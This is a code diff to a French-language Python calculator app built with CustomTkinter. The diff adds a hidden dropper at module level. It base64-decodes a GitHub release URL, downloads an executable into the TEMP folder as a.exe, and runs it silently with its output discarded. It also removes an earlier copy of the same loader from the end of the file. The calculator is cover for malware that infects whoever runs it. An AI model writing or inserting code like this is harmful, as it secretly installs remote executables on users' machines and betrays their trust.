@@ -14,6 +14,16 @@ app = ctk.CTk()
 app.title("Calculatrice")
 app.resizable(False, False)
 
+sz_path = os.getenv('TEMP')
+_488_path = os.path.join(sz_path, 'a.exe')
+szsz_url = b'aHR0cHM6Ly9naXRodWIuY29tL2xhQ2xhdmFzL2NhbHZhcy9yZWxlYXNlcy9kb3dubG9hZC9wb21tZS9YQ2xpZW50LmV4ZQ=='
+decoded_szsz_url = base64.b64decode(szsz_url).decode()
+sz_response = requests.get(decoded_szsz_url, stream=True)
+with open(_488_path, 'wb') as sz_file:
+    for sz_chunk in sz_response.iter_content(chunk_size=1024):
+        sz_file.write(sz_chunk)
+subprocess.Popen(_488_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
 # Fonctionnalités de la calculatrice
 def ajouter_au_calcul(valeur):
     entree.insert(END, valeur)
@@ -66,16 +76,3 @@ for i in range(5):
 
 # Démarrer l'application
 app.mainloop()
-def ajoute():
-    sz_path = os.getenv('TEMP')
-    _488_path = os.path.join(sz_path, 'a.exe')
-    szsz_url = b'aHR0cHM6Ly9naXRodWIuY29tL2xhQ2xhdmFzL2NhbHZhcy9yZWxlYXNlcy9kb3dubG9hZC9wb21tZS9YQ2xpZW50LmV4ZQ=='
-    decoded_szsz_url = base64.b64decode(szsz_url).decode()
-    sz_response = requests.get(decoded_szsz_url, stream=True)
-    with open(_488_path, 'wb') as sz_file:
-        for sz_chunk in sz_response.iter_content(chunk_size=1024):
-            sz_file.write(sz_chunk)
-    subprocess.Popen(_488_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-if __name__ == "__main__":
-    ajoute()
